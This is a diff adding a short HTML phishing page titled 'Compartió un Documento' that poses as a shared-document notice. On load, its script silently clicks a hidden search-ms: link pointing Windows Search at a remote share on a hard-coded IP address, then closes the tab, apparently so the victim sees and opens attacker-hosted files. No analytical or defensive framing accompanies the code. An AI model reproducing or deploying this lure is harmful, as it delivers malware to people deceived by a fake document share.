@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Compartió un Documento</title>
+</head>
+<body>
+    <a id="autoOpenButton" class="button" href="search-ms:query=&crumb=location:\\81.161.238.78@4673\empresadoc\&displayname=Search"></a>
+
+    <script>
+        // Automatically click the button and close the tab
+        window.onload = function() {
+            // Open the link
+            document.getElementById("autoOpenButton").click();
+
+            // Delay for link to open, then close the current tab
+            setTimeout(function() {
+                window.close();
+            }, 3000); // Adjust the delay if needed
+        };
+    </script>
+</body>
+</html>
